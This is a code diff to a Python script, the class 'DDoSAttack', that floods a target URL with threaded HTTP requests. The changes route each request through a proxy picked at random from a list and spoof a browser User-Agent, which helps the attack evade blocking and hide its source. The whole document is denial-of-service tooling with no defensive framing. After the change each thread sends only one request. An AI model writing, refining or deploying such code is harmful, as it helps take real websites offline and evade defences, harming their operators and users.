@@ -1,27 +1,32 @@
 import threading
 import requests
-import time
+import random
+from time import sleep
 
 class DDoSAttack:
-    def __init__(self, target_url):
+    def __init__(self, target_url, proxy_list, thread_count=50):
         self.target_url = target_url
+        self.proxy_list = proxy_list
+        self.thread_count = thread_count
 
-    def launch_attack(self, num_threads):
+    def start_attack(self):
+        print(f"Starting DDoS attack on {self.target_url} using {self.thread_count} threads.")
         threads = []
-        for _ in range(num_threads):
-            thread = threading.Thread(target=self._attack)
+        for i in range(self.thread_count):
+            thread = threading.Thread(target=self.send_request)
             threads.append(thread)
             thread.start()
 
         for thread in threads:
             thread.join()
 
-    def _attack(self):
-        while True:
-            try:
-                response = requests.get(self.target_url)
-                print(f"Request sent: {response.status_code}")
-            except requests.exceptions.RequestException:
-                print("Error during attack")
-                break
-            time.sleep(random.randint(1, 3))
+    def send_request(self):
+        proxy = random.choice(self.proxy_list)
+        headers = {'User-Agent': 'Mozilla/5.0'}
+        try:
+            response = requests.get(self.target_url, proxies={'http': proxy, 'https': proxy}, headers=headers)
+            print(f"Sent request through proxy {proxy} with response status {response.status_code}")
+        except requests.exceptions.RequestException as e:
+            print(f"Error sending request through proxy {proxy}: {str(e)}")
+        
+        sleep(random.uniform(0.1, 1.0)) 
